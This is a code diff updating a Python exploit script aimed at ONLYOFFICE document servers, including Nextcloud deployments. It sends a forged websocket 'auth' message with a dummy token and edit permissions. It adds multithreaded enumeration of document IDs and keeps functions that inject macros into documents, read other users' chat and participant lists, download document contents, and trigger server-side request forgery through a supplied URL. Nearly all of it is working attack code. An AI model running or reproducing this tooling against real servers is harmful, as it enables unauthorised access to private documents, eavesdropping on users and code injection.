@@ -1,11 +1,11 @@
 #!/usr/bin/python3
 # Exploit ONLYOFFICE implementations
 
-import argparse, sys, re, time, signal, requests, uuid, json, tempfile, os, subprocess, websocket, base64, threading, hashlib
+import argparse, sys, re, time, signal, requests, uuid, json, tempfile, os, subprocess, websocket, base64, threading, hashlib, datetime, traceback
 from urllib.parse import urlparse, parse_qs
 import concurrent.futures
 
-def process_fileparts( txt ):
+def process_fileparts( txt, docid=None ):
   txt = txt.replace(r'\"','"')[3:-2]
   m = re.search(r'([0-9]\+)\/Editor\.bin\/',txt)
   if m:
@@ -29,7 +29,10 @@ def process_fileparts( txt ):
     print(' done')
   print( 'finished downloads')
   infile = os.path.join(tmpdir,'Editor.bin')
-  outfile = os.path.join(tmpdir,'document.docx')
+  if docid:
+    outfile = str(docid)+'.docx'
+  else:
+    outfile = 'document.docx'
   print('Attempting to convert ',infile,'to',outfile)
   subprocess.check_output(['x2t/x2t',infile,outfile])
   # subprocess.check_output(['open',outfile])
@@ -60,8 +63,11 @@ class WsClient():
 
   autodownload=False
   testsecret=True
+  output=True
 
-  def __init__( self, url, docid, platform, username='admin' ):
+  def __init__( self, url, docid, platform, username='admin', output=True, disconnect=False ):
+    self.output = output
+    self.disconnect = disconnect
     self.docid = docid
     self.platform = platform
     self.url = url
@@ -74,74 +80,111 @@ class WsClient():
     if self.platform == 'nextcloud':
       self.url = self.url + '/ds-vpath/doc/'+self.docid+'/c/1/a/websocket'
 
-    print( 'Connecting to', self.url )
+    if self.output: print( 'Connecting to', self.url )
     self.ws = websocket.create_connection( self.url )
 
     # Spawn socket listener
     self.spawn_listener()
 
+  def close( self ):
+    if self.output: print('Closing connection')
+    self.send({'type':'close'})
+    self.ws.close()
+    self.stop_listener()
+
+  def stop_listener( self ):
+    if self.output: print('Stopping listener')
+    self.listener.kill.set()
+
   def send( self, message ):
+    if not self.ws.connected: return
     if type( message ) != str:
       # JSON containing JSON string
       message = json.dumps([json.dumps(message)])
-    print(message)
     self.ws.send( message )
 
-  def send_json( self, data ):
-    data = json.dumps([json.dumps(data)])
-    self.send( data )
-
   def recv( self ):
-    return self.ws.recv()
+    try:
+      return self.ws.recv()
+    except:
+      return '' 
+      
 
   def recv_listen( self ):
-    while True:
+    while self.ws.connected:
       msg = self.recv()
+      if msg == '': 
+        if self.output: print('Exiting listen loop')
+        return
       if msg.startswith('a["{'):
         try:
           data = json.loads(json.loads(msg[1:])[0])
-          print("RECV:", data['type'] )
+          if self.output: print("RECV:", data['type'] )
           if data['type'] == 'message':
             for m in data['messages']:
-              print(m['username']+':',m['message'])
+              if self.output: 
+                print(datetime.datetime.utcfromtimestamp(round(m['time']/1000)).strftime('[%Y-%m-%d %H:%M:%S] ') + m['username'] + ': ' + m['message'])
+          
           elif data['type'] == 'documentOpen':
+            if data["data"]["status"] == 'err':
+              self.close()
+              return
+            print('FOUND:',self.docid)
             if self.testsecret:
               test_secret_string( data['data']['data']['Editor.bin'] )
+            if self.disconnect:
+              self.close()
+          
+          elif data['type'] in ('auth','connectState'):
+            if self.output:
+              if 'participants' in data and len(data['participants']) > 0:
+                print('\nParticipants:') 
+                for p in data['participants']:
+                  print(' - '+p['username'])
+
+              if 'messages' in data and len(data['messages']) > 0:
+                print('\nMessages:')
+                for m in data['messages']:
+                  print(datetime.datetime.utcfromtimestamp(round(m['time']/1000)).strftime('[%Y-%m-%d %H:%M:%S] ') + m['username'] + ': ' + m['message'])
+
           elif data['type'] == 'rpc':
-            print(data)
+            if self.output: print(data)
           else:
-            print('')
-        except:
-          print("RECV:", msg)
+            if self.output: print('')
+        except Exception as e:
+          if self.output: print("ERR:", e)
       else:
-        print("RECV:", msg)
+        if self.output: print("RECV:", msg)
       if self.autodownload and 'Editor.bin' in msg:
-        process_fileparts(msg)
+        process_fileparts(msg, self.docid)
+        if self.disconnect:
+          self.close()
 
   def spawn_listener( self ):
     self.listener = threading.Thread( target=self.recv_listen )
+    self.listener.kill = threading.Event()
     self.listener.start()
 
   def send_chat_message( self, msg ):
-    # ["{\"type\":\"message\",\"message\":\"Egg!\"}"]
-    data = json.dumps([json.dumps({
+    data = {
       'type': 'message',
       'message': msg 
-    })])
+    }
     self.send( data )
 
   def get_messages( self ):
-    self.send_json({"type":"getMessages"})
+    self.send({"type":"getMessages"})
 
   def chat( self ):
     print('\nChat mode\n=========\nType messages, ENTER to send\n')
     self.get_messages()
-    while True:
-      msg = input('> ')
+    while self.ws.connected:
+      msg = input()
       self.send_chat_message(msg.strip())
+    print('CHAT: Disconnected')
 
   def rename( self, name ):
-    self.send_json(
+    self.send(
     {
       "type":"rpc",
       "data": {
@@ -151,14 +194,42 @@ class WsClient():
     })
 
   def auth( self, docurl='' ):
-    txt = r'["{\"type\":\"auth\",\"docid\":\"'+self.docid+r'\",\"token\":\"a\",\"user\":{\"id\":\"a\",\"username\":\"'+self.username+r'\",\"firstname\":null,\"lastname\":null,\"indexUser\":-1},\"editorType\":0,\"lastOtherSaveTime\":-1,\"block\":[],\"sessionId\":null,\"sessionTimeConnect\":null,\"sessionTimeIdle\":0,\"documentFormatSave\":65,\"view\":false,\"isCloseCoAuthoring\":false,\"openCmd\":{\"c\":\"open\",\"id\":\"'+self.docid+r'\",\"userid\":\"a\",\"format\":\"docx\",\"url\":\"'+docurl+r'\",\"title\":\"whatever.docx\",\"lcid\":2057,\"nobase64\":false},\"lang\":null,\"mode\":null,\"permissions\":{\"edit\":true},\"IsAnonymousUser\":false}"]'
-    self.send( txt )
-    # print( self.recv() )
-    # count = 1
-    # while count < 3:
-    #   # print( 'Count:', count )
-    #   result = self.recv()
-    #   count += 1
+    data = {
+      'type': 'auth',
+      'docid': self.docid,
+      'token': 'a',
+      'user': {
+        'id':'a',
+        'username': self.username,
+        'firstname':'',
+        'lastname':'',
+        'indexUser':-1
+      },
+      'editorType':0,
+      'lastOtherSaveTime':-1,
+      'block':[],
+      'sessionId':None,
+      'sessionTimeConnect':None,
+      'sessionTimeIdle':0,
+      'documentFormatSave':65,
+      'view':False,
+      'isCloseCoAuthoring':False,
+      'openCmd':{
+        'c':'open',
+        'id':self.docid,
+        'userid':'a',
+        'format':'docx',
+        'url':docurl,
+        'title':'document.docx',
+        'lcid':2057,
+        'nobase64':False
+      },
+      'lang':None,
+      'mode':None,
+      'permissions':{'edit':True},
+      'IsAnonymousUser':False
+    }
+    self.send( data )
     
 
   def save_changes( self, changes ):
@@ -179,9 +250,6 @@ class WsClient():
       'releaseLocks':False
     }
     self.send( message )
-    while True:
-      print( self.recv() )
-
 
   def inject_macro( self, macrotxt ):
     payload = json.dumps({
@@ -233,11 +301,30 @@ def main():
 
   # Document enumeration
   if args.command == 'enum':
+    print('Attempting document id enumeration')
+    threads = []
+    start = time.time()
     with open( args.docids, 'r' ) as f:
-      for line in f.readline():
+      count = 1
+      for line in f:
+        clear = False
         docid = line.strip()
-        client = WsClient( args.url, docid, args.platform )
-        client.auth()
+        while not clear:
+          try:
+            rate = round(count/(time.time() - start))
+            print( count, docid, '  ', threading.active_count(), '  ', str(rate)+'/s', end='       \r' )
+            client = WsClient( args.url, docid, args.platform, output=False, disconnect=True)
+            client.auth()
+            count+=1
+            clear = True
+            while threading.active_count() > 6:
+              # print('Waiting for active threads to calm down:', threading.active_count(),end='               \r')
+              time.sleep(1)
+          except Exception as e:
+            print( count )
+            print( e )
+            # print(traceback.format_exc())
+    
     sys.exit(0)
 
   client = WsClient( args.url, args.docid, args.platform, username=args.username )
@@ -246,6 +333,7 @@ def main():
   if args.command == 'macro':
     with open(args.script, 'r') as f:
       client.auth()
+      time.sleep(1)
       print('Injecting',args.script)
       client.inject_macro(f.read())
 
@@ -253,6 +341,7 @@ def main():
   # SSRF
   if args.command == 'dl':
     client.autodownload = True
+    client.disconnect = True
     client.auth( args.docurl )
 
   # Chat
